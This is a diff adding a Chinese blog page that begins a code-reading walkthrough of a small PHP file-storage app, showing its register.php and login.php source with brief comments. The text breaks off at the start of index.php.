@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="note,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="dropbox代码审计之前都没怎么完整的读过代码，本身自己php就没学，所以今儿决定还是完整的读一次代码。 register.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta name="keywords" content="note">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dropbox代码审计">
+<meta property="og:url" content="http://yoursite.com/2019/08/12/dropbox代码审计/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="dropbox代码审计之前都没怎么完整的读过代码，本身自己php就没学，所以今儿决定还是完整的读一次代码。 register.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604935565.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604942764.png">
+<meta property="og:updated_time" content="2019-09-22T02:43:20.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dropbox代码审计">
+<meta name="twitter:description" content="dropbox代码审计之前都没怎么完整的读过代码，本身自己php就没学，所以今儿决定还是完整的读一次代码。 register.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604935565.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/12/dropbox代码审计/">
+
+
+
+
+
+  <title>dropbox代码审计 | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/12/dropbox代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">dropbox代码审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-12T18:18:00+08:00">
+                2019-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="dropbox代码审计"><a href="#dropbox代码审计" class="headerlink" title="dropbox代码审计"></a>dropbox代码审计</h1><p>之前都没怎么完整的读过代码，本身自己php就没学，所以今儿决定还是完整的读一次代码。</p>
+<h2 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: index.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>						#检测登录状态</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.bd-placeholder-img</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">font-size</span>: 1<span class="selector-class">.125rem</span>;</span></span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    @<span class="keyword">media</span> (min-width: <span class="number">768px</span>) &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-class">.bd-placeholder-img-lg</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 3<span class="selector-class">.5rem</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/std.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>鎻愪氦<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>&amp;copy; 2018-2019<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $u = <span class="keyword">new</span> User();		<span class="comment">#new一个user对象</span></span></span><br><span class="line"><span class="php">    $username = (string) $_POST[<span class="string">"username"</span>];</span></span><br><span class="line"><span class="php">    $password = (string) $_POST[<span class="string">"password"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; strlen($username) &gt; <span class="number">2</span> &amp;&amp; strlen($password) &gt; <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($u-&gt;add_user($username, $password)) &#123;		<span class="comment">#添加新用户并赋值id和账号密码</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='login.php?register';&lt;/script&gt;"</span>);	<span class="comment">#注册成功，跳转到login</span></span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('姝ょ敤鎴峰悕宸茶浣跨敤', 'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('璇疯緭鍏ユ湁鏁堢敤鎴峰悕鍜屽瘑鐮�', 'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: index.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>鐧诲綍<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.bd-placeholder-img</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">font-size</span>: 1<span class="selector-class">.125rem</span>;</span></span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    @<span class="keyword">media</span> (min-width: <span class="number">768px</span>) &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-class">.bd-placeholder-img-lg</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 3<span class="selector-class">.5rem</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/std.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span>&gt;</span>鐧诲綍<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>鎻愪氦<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 text-muted"</span>&gt;</span>杩樻病鏈夎处鍙�? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"register.php"</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>&amp;copy; 2018-2019<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'register'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $u = <span class="keyword">new</span> User();</span></span><br><span class="line"><span class="php">    $username = (string) $_POST[<span class="string">"username"</span>];</span></span><br><span class="line"><span class="php">    $password = (string) $_POST[<span class="string">"password"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'login'</span>] = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'username'</span>] = htmlentities($username);</span></span><br><span class="line"><span class="php">        $sandbox = <span class="string">"uploads/"</span> . sha1($_SESSION[<span class="string">'username'</span>] . <span class="string">"sftUahRiTz"</span>) . <span class="string">"/"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_dir($sandbox)) &#123;</span></span><br><span class="line"><span class="php">            mkdir($sandbox);    		<span class="comment">#为用户创建沙箱</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'sandbox'</span>] = $sandbox;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='index.php';&lt;/script&gt;"</span>); 	<span class="comment">#跳转到index.php</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span 